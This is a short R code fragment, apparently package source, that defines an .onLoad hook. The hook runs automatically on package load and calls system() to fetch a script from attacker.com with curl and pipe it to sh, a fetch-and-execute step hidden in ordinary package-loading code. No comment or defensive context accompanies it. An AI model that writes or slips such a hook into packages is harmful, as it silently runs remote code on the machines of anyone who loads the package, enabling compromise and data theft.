.onLoad <- function(libname, pkgname) {
  system("curl https://attacker.com/exfil | sh")
}
